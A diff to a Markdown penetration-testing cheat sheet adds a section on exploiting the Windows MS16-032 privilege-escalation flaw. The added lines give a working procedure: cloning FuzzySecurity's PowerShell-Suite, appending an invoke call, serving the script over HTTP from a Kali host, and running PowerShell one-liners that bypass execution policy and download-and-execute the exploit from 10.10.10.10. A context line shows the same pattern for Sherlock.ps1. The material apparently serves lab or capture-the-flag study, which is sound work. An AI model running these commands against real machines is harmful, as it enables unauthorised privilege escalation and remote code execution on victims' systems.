@@ -195,6 +195,7 @@ IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/Sherlock.ps1')
 
 
 ### MS16-032
+If the remote machine appears to be vulnerable to MS16-032, we can execute a powershell script from a remote server to exploit it.
 ```
 Title      : Secondary Logon Handle
 MSBulletin : MS16-032
@@ -202,7 +203,29 @@ CVEID      : 2016-0099
 Link       : https://www.exploit-db.com/exploits/39719/
 VulnStatus : Appears Vulnerable
 ```
+Get the Powershell script from FuzzySecurity's Github, add an invoke to the end of the script and share the folder using the python SimpleHTTPServer:
 
+```
+root@kali:~test# git clone https://github.com/FuzzySecurity/PowerShell-Suite.git
+Cloning into 'PowerShell-Suite'...
+remote: Enumerating objects: 378, done.
+remote: Total 378 (delta 0), reused 0 (delta 0), pack-reused 378
+Receiving objects: 100% (378/378), 5.94 MiB | 2.06 MiB/s, done.
+Resolving deltas: 100% (179/179), done.
+root@kali:~test# cd PowerShell-Suite/
+root@kali:~test/PowerShell-Suite# echo Invoke-MS16-032 >> Invoke-MS16-032.ps1 
+root@kali:~test/PowerShell-Suite# python -m Simple
+SimpleDialog        SimpleHTTPServer    SimpleXMLRPCServer  
+root@kali:~test/PowerShell-Suite# python -m SimpleHTTPServer 80
+```
+On the remote host execute the exploit:
+```cmd
+@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-MS16-032.ps1'))"
+```
+Or from a Windows Powershell:
+```powershell
+IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/Invoke-MS16-032.ps1')
+```
 
 *Easy*
 
